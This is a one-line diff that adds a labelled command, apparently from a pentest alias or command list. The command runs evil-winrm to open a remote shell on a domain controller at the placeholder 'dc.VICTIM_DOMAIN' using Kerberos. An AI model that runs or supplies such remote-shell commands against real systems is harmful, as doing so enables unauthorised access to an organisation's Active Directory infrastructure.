@@ -1,0 +1,1 @@
+sync-ad evil-winrm -i dc.VICTIM_DOMAIN -r VICTIM_DOMAIN
